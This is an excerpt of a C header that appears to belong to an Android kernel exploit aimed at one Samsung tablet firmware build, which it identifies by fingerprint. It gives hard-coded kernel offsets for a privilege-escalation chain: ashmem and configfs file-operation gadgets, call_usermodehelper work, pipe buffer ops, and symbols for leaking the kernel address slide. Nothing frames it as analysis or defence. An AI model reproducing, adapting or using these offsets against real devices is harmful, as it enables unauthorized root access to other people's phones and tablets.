 ...
 * ------------------------------------------------------------------------- */
#define BUILD_VARIANT_LABEL "essi-X400XXS6CZG3-app"
#define PHYS_P0_ORACLE 1
#define SLIDE_ROUTE SLIDE_ROUTE_FPSIMD

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
"samsung/gts10litewifixx/essi:16/BP4A.251205.006/X400XXS6CZG3:user/release-keys"
#endif
...
"targets/essi-X400XXS6CZG3/p0_fingerprint.h"
...
#define KMALLOC_CACHES_OFF        0x01b0a4f0ULL
#define ANON_PIPE_BUF_OPS_OFF     0x019185e0ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x02bd9da4ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00101098ULL

/* --- ashmem / configfs / fops gadgets ------------------------------------- */
#define ASHMEM_FOPS_OFF           0x01ab9488ULL
#define ASHMEM_MISC_FOPS_OFF      0x024ff750ULL
#define ASHMEM_IOCTL_OFF          0x00d03cfcULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x00d042b4ULL
#define ASHMEM_MMAP_OFF           0x00d0430cULL
#define ASHMEM_OPEN_OFF           0x00d04548ULL
#define ASHMEM_RELEASE_OFF        0x00d045ccULL
#define ASHMEM_SHOW_FDINFO_OFF    0x00d046ecULL
#define CONFIGFS_READ_ITER_OFF    0x00475b50ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0047600cULL
#define COPY_SPLICE_READ_OFF      0x003fcce8ULL
#define NOOP_LLSEEK_OFF           0x003b1ed0ULL

/* --- slide leak symbols ---------------------------------------------------- */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x0180315dULL //mm offset
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x023925a8ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x024be6f8ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02746049ULL
